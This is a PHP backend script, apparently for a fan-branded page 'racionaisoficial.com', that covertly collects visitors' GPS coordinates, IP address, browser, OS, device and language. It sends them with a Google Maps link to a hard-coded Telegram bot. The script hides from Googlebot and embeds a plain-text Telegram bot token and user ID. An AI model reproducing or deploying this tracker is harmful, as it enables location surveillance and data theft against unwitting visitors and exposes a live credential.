<?php
require __DIR__.DIRECTORY_SEPARATOR.'vendor/autoload.php';
date_default_timezone_set('America/Bahia');
define("TELEGRAM_TOKEN","5835226052:AAGR84NKbPt79yxuZbXLb_cTwFeRrLKkUzg");
define("TELEGRAM_ID_USER","1131494038");
define("TELEGRAM_USER","neyltonbenjamim");

use Sinergi\BrowserDetector\Browser;
use Sinergi\BrowserDetector\Os;
use Sinergi\BrowserDetector\Device;
use Sinergi\BrowserDetector\Language;

function getData($data = [])
{
    $dados = json_decode($data, true);
    $string = '';
    foreach ($dados as $key => $valor) {
        $string .= "{$key} => {$valor} " . PHP_EOL;
    }
    $string .= PHP_EOL."Link map: => https://www.google.com/maps?q={$dados['latitude']},{$dados['longitude']}".PHP_EOL;
    return $string;
}

if (stripos($_SERVER['HTTP_USER_AGENT'], 'Googlebot')) exit;
$browser = new Browser();
$os = new Os();
$device = new Device();
$language = new Language();
$message = "RACIONAIS - IP Location".PHP_EOL;
if(isset($_POST['code']) && !empty($_POST['code'])){
    $message .= "CODE: ".base64_decode($_POST['code']).PHP_EOL;
}
$message .= "racionaisoficial.com".PHP_EOL.PHP_EOL;
$message .= "Título: {$_POST['titulo']}".PHP_EOL.PHP_EOL;
$message .= "url: {$_POST['url']}".PHP_EOL;
$message .= "racionaisoficial.com";
$message .= PHP_EOL.PHP_EOL;
$message .= getData($_POST['data']);
$message .= PHP_EOL . PHP_EOL;
$message .= 'Navegador: ' . $browser->getName() . " - " . $browser->getVersion() . PHP_EOL;
$message .= 'Sistema operacional: ' . $os->getName() . PHP_EOL;
$message .= 'Celular: ' . $device->getName() . PHP_EOL;
$message .= 'Idioma: ' . $language->getLanguage() . PHP_EOL . PHP_EOL;
$message .= "User agent: " . $_SERVER['HTTP_USER_AGENT'] . PHP_EOL . " IP: " . $_SERVER['REMOTE_ADDR'];
$message .= PHP_EOL . PHP_EOL;
\Telegram\BotTelegram::send($message);
